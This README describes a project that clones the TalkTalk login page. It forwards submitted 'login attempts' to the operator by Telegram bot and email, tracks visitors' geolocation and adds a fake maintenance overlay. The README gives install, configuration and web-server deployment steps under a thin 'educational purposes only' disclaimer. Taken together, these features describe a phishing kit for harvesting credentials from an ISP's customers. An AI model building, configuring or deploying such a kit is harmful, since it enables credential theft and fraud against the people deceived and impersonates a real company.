# TalkTalk Login Page

A responsive login page for TalkTalk services with Telegram and email notifications.

## Features

- Responsive design for all devices (desktop, tablet, mobile)
- Telegram bot integration to receive login attempts
- Email notifications
- Accurate geolocation tracking
- Professional maintenance overlay
- Privacy Policy page

## Installation

1. Clone or download the project
2. Navigate to the project directory
3. Install dependencies:
   ```bash
   npm install
   ```

## Configuration

1. Copy `.env.example` to `.env`
2. Fill in your credentials in `.env`:
   ```
   TELEGRAM_BOT_TOKEN=your_bot_token
   TELEGRAM_CHAT_ID=your_chat_id
   SMTP_HOST=smtp.gmail.com
   SMTP_PORT=587
   SMTP_USER=your_email@gmail.com
   SMTP_PASS=your_app_password
   RECIPIENT_EMAIL=recipient@example.com
   ```

## Usage

### Option 1: Using the batch file
Double-click `Start-Server.bat`

### Option 2: Using npm
```bash
npm start
```

Then open your browser and go to `http://localhost:8000`

## Project Structure

```
TT/
├── index.html          # Main login page
├── privacy-policy.html # Privacy Policy page
├── server.js           # Node.js server
├── package.json        # Project dependencies
├── .env.example        # Example environment file
├── .gitignore          # Git ignore rules
└── README.md           # This file
```

## Deployment

For deployment, copy the necessary files to your web server. Note: This project is for educational purposes only.

## License

This project is for demonstration purposes only.
